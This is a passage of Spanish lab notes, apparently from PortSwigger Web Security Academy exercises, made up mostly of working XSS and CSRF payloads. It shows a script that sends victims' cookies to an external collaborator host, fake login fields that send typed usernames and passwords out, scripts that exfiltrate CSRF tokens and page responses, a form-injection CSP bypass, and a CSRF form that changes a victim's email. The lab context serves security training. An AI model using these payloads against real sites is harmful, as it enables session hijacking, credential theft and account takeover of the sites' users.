...
```
<script>
fetch("https://bm1mfpksbatk21yuuuv7qhzbp2vtjj78.oastify.com/?cookie=" + btoa(document.cookie));
</script>
```
- Despues sustituyes su cookie por la suya:
![[Pasted image 20260623005310.png]]
![[Pasted image 20260623005325.png]]

Captura de contraseñas mediante XSS:
```html
Introduce tus credenciales: <br></br>

Usuario: <input name=username id=username onchange="fetch('https://rd8265b82qk0thpalamnhxqrgim9a0yp.oastify.com?username=' + this.value)"><br></br>
Password: <input type=password name=password id=password onchange="fetch('https://rd8265b82qk0thpalamnhxqrgim9a0yp.oastify.com?password=' + this.value)">
```
![[Pasted image 20260623010134.png]]

Evasion de CSRF con XSS:
```js
<script>
	...
	req2.open("GET", "https://g9qijgg9qi24rzwqgzwkd23y3p9gx7lw.oastify.com?response=" + btoa(response));
	req2.send();
</script>
```
...
<script>
	...
	var req2 = new XMLHttpRequest();
	req2.open("GET", "https://g9qijgg9qi24rzwqgzwkd23y3p9gx7lw.oastify.com?token=" + csrf_token);
	req2.send();
</script>
```
...
CPS Bypass:
```html
?email=prueba"></form><form class="login_form" name ="myform" action="https://exploit-0a34003704a78fe380a11c8a01ef00be.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click me</button>
```

```html
<script>
location='https://0a2400f204568f0b80fa1dd500660079.web-security-academy.net/my-account?email=prueba"></form><form class="login_form" name ="myform" action="https://exploit-0a34003704a78fe380a11c8a01ef00be.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click me</button';
</script>
...
<html>
  ...
  <body>
    <form action="https://0a2400f204568f0b80fa1dd500660079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net" />
      <input type="hidden" name="csrf" value="9zYBzytUTkcOpA4X33I9x49qQ6Tvz3Qk" />
